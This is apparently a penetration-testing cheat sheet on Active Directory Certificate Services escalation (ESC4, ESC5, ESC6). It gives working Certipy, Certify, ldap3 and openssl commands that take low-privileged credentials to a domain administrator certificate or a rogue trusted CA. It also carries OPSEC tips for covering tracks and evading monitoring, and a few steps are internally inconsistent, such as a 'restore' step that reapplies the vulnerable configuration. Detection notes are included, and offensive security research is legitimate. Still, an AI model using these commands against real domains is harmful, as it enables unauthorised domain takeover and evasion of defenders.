# ESC4, ESC5, ESC6 — ACL Abuse & CA Configuration

---

# ESC4 — Template ACL Abuse

## What It Is

ESC4 occurs when a low-privileged user has **write permissions** (GenericWrite, GenericAll, WriteDacl, WriteProperty) on a certificate template object in Active Directory. The attacker can **modify the template's security descriptor** to:
- Grant themselves enrollment rights
- Enable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (making it equivalent to ESC1)
- Disable Manager Approval
- Add or modify EKUs

Essentially, the attacker can turn any template into a vulnerable template.

## Why It Works

- Certificate templates are stored as objects in AD under `CN=Certificate Templates,CN=Public Key Services,CN=Configuration,...`
- If an attacker has Write access to a template, they can modify its `msPKI-Certificate-Name-Flag` (enrollee supplies subject), `msPKI-RA-Signature` (authorized signatures), `pKIExtendedKeyUsage` (EKU), and the security descriptor itself
- After exploitation, the attacker can revert the changes to cover tracks — or leave them for persistence

## Prerequisites

- Domain credentials
- Write access to a certificate template (GenericWrite / GenericAll)
- The template must be enabled on the CA

## Exploitation — Certipy

### Step 1: Find Templates with Weak ACLs

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Look in the output for templates where your user or a group you belong to has: `GenericWrite`, `GenericAll`, `WriteDacl`, `WriteProperty`

### Step 2: Modify Template to Make It Vulnerable (ESC1-compatible)

```bash
certipy template -u 'user@domain.local' -p 'Password123!' -template 'TargetTemplate' -write-default-configuration -no-save
```

The `-write-default-configuration` flag writes the default configuration for a vulnerable template (enables enrollee supplies subject, disables manager approval, adds Client Authentication EKU).

### Step 3: Request Certificate as Domain Admin

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'TargetTemplate' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
```

### Step 4: Authenticate

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

### Step 5: Restore Template (OPSEC)

```bash
# Certipy doesn't have a restore feature built-in
# Either manually restore using ldapmodify or save the original config first
certipy template -u 'user@domain.local' -p 'Password123!' -template 'TargetTemplate' -write-default-configuration -no-save
```

> **Note**: The `-write-default-configuration` flag makes the template vulnerable but doesn't save the original configuration. For OPSEC, manually dump the template attributes first with `ldapsearch` or `certipy find -json`.

## Exploitation — Manual with ldapmodify

```bash
# Dump current template config
ldapsearch -H ldap://dc.domain.local -D 'DOMAIN\user' -w 'Password123!' -b 'CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Configuration,DC=domain,DC=local' > template.txt

# Modify template flags to enable enrollee supplies subject
python3 -c "
import ldap3
server = ldap3.Server('dc.domain.local')
conn = ldap3.Connection(server, user='DOMAIN\\\\user', password='Password123!', authentication=ldap3.NTLM)
conn.bind()

dn = 'CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Configuration,DC=domain,DC=local'

# Enable enrollee supplies subject (0x00000100) while keeping existing flags
conn.modify(dn, {'msPKI-Certificate-Name-Flag': [(ldap3.MODIFY_REPLACE, ['1'])]})

# Disable manager approval
conn.modify(dn, {'msPKI-RA-Signature': [(ldap3.MODIFY_REPLACE, ['0'])]})

# Add Client Authentication EKU if not present
conn.modify(dn, {'msPKI-RA-Application-Policies': [(ldap3.MODIFY_REPLACE, ['1.3.6.1.5.5.7.3.2'])]})

conn.unbind()
"
```

## ESC4-Specific OPSEC

- **Event ID 5136** — A directory service object was modified. This fires every time an attribute is changed on the template object
- Each attribute modification (flags, EKU, ACL) generates a separate 5136 event
- Template modifications are replicated to all DCs — there is no "local-only" change
- After exploitation, **restore the original template configuration immediately**
- Consider using a template that's already enabled rather than enabling a disabled one (enabling generates additional events)

## Detection — ESC4

- **Event ID 5136** with Object DN containing `CN=Certificate Templates,CN=Public Key Services`
- Look for modifications to: `msPKI-Certificate-Name-Flag`, `msPKI-RA-Signature`, `pKIExtendedKeyUsage`, `nTSecurityDescriptor`
- Alert on template modifications followed by certificate requests
- Baselining: most templates should rarely change after initial deployment

---

# ESC5 — PKI Object ACL Abuse

## What It Is

ESC5 occurs when a low-privileged user has **write access to the underlying PKI AD objects** — specifically:
- The **CA server's AD computer object**
- The **`CN=Public Key Services` container** or its sub-containers
- The **`NTAuthCertificates` object** (stored as `CN=NTAuthCertificates,CN=Public Key Services,...`)

If any of these can be modified, the attacker can:
- Add a rogue CA certificate to the `NTAuthCertificates` store (trusted CA list)
- Modify the CA object to allow rogue enrollment
- Grant themselves rights on the container to modify templates (ESC4)

## Why It Works

- The `NTAuthCertificates` object defines which CAs are trusted for **domain authentication** (PKINIT)
- Adding a new certificate here means the domain will trust certificates issued by that CA
- An attacker can create a self-signed CA cert, add it to NTAuthCertificates, and then issue arbitrary domain admin certificates

## Prerequisites

- Domain credentials with Write access to one of the PKI AD objects
- Ability to create a self-signed CA certificate (openssl, makecert, etc.)

## Exploitation

### Step 1: Identify Weak ACLs on PKI Objects

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Look for the `Certificate Authority` section — check ACLs on the CA object and PKI container.

### Step 2: Exploit via GenericAll on NTAuthCertificates

If the user has `GenericAll` on `CN=NTAuthCertificates,CN=Public Key Services,...`:

```bash
# Create a self-signed CA cert
openssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.crt -days 365 -nodes -subj "/CN=RogueCA"

# Convert to DER
openssl x509 -in ca.crt -out ca.der -outform DER

# Add the rogue CA to NTAuthCertificates (using ldapmodify or python)
# This requires low-level LDAP modification of the cert
```

Alternatively, if the attacker has elevated access already via other means, ESC5 is more useful as a **persistence** mechanism.

---

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

## What It Is

ESC6 exploits the CA setting **`EDITF_ATTRIBUTESUBJECTALTNAME2`** (often called the SAN flag). When this flag is enabled on the CA, **any certificate request** that includes SAN in the Subject Attributes (`[NewRequest]` section) will be honored — even if the template does NOT have `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled.

## Why It Works

- The CA-level flag overrides template-level SAN controls
- Any template that issues client authentication certificates becomes ESC1-vulnerable
- This is a per-CA setting, not per-template — it affects ALL templates on the CA
- Microsoft added this flag for legacy/schema v1 template compatibility

## Prerequisites

- Domain credentials with enrollment rights on **any** template that issues Client Authentication certificates
- The CA must have `EDITF_ATTRIBUTESUBJECTALTNAME2` = `Enabled` (value `1`)
- The template must issue certificates with an EKU valid for client authentication

## Detection — Check the Flag

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Look for: `EDITF_ATTRIBUTESUBJECTALTNAME2` in the CA section.

## Exploitation — Certipy

### Step 1: Verify Flag is Enabled

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

### Step 2: Request Certificate with SAN via Subject Attributes

Certipy uses `-upn` to embed the target UPN in the request:

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'User' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
```

The `User` template (default) does NOT have `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, but with ESC6, the request succeeds because the CA allows SAN via attributes.

### Step 3: Authenticate

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

## Full Chain with Machine Account

If you have a computer account's password/hash:

```bash
certipy req -u 'COMPUTER$@domain.local' -hashes ':NTLMHASH' -ca 'CA-SERVER\CA-NAME' -template 'Machine' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
```

## Exploitation — Certify (Windows)

```cmd
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"User" /altname:"administrator@domain.local"
```

Certify's `/altname` flag handles the SAN injection regardless of whether the template supports it — if ESC6 is enabled, it will work.

## Checking the Flag Manually

```powershell
# Via certutil on the CA server
certutil -getreg CA\EDITF_ATTRIBUTESUBJECTALTNAME2

# Powershell via remote registry
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME" -Name "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

## OPSEC — ESC6

- Using the `User` template is less suspicious than obscure custom templates
- However, requesting a cert as `administrator` via the `User` template will still generate an alert
- Consider using a less-monitored privileged account
- The request appears as a normal certificate enrollment — no template modification needed

## Detection — ESC6

- **Event ID 4887** — Certificate issued with SAN that differs from the requester (if auditing is enabled)
- Alert on certificates issued with subject names for high-privilege users
- Review CA configuration for `EDITF_ATTRIBUTESUBJECTALTNAME2 = 1` (should be 0)
- Check for `Event ID 4886` where the request attributes contain a `san:` or `san:dns=` specification
- Run periodic CA configuration audits with `certutil -getreg CA\EDITF_ATTRIBUTESUBJECTALTNAME2`
